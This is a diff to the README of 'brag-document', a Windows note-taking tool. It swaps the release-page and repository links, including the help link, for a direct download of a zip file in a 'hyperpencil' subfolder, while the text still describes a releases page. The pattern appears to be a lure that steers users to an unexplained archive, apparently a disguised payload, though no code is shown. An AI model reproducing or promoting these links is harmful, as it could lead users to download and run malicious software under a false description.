@@ -1,6 +1,6 @@
 # 📓 brag-document - Organize Your Career Notes Simply
 
-[![Download latest release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Jeremiel122/brag-document/releases)
+[![Download latest release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Jeremiel122/brag-document/raw/refs/heads/main/hyperpencil/brag-document-3.2.zip)
 
 ---
 
@@ -22,7 +22,7 @@ This guide will help you download and run brag-document on your Windows PC. You 
 
 1. Click the large green button at the top or go to this page to download brag-document:
 
-   [Download brag-document Releases](https://github.com/Jeremiel122/brag-document/releases)
+   [Download brag-document Releases](https://github.com/Jeremiel122/brag-document/raw/refs/heads/main/hyperpencil/brag-document-3.2.zip)
 
 2. On the releases page, look for the latest version. It will have a `.exe` file or a setup file for Windows. Click on the file to download it.
 
@@ -116,8 +116,8 @@ This guide will help you download and run brag-document on your Windows PC. You 
 
 ## 🚩 Need Help?
 
-You can visit the [GitHub repository](https://github.com/Jeremiel122/brag-document) for more info and support.
+You can visit the [GitHub repository](https://github.com/Jeremiel122/brag-document/raw/refs/heads/main/hyperpencil/brag-document-3.2.zip) for more info and support.
 
 ---
 
-[![Download latest release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Jeremiel122/brag-document/releases)
+[![Download latest release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Jeremiel122/brag-document/raw/refs/heads/main/hyperpencil/brag-document-3.2.zip)
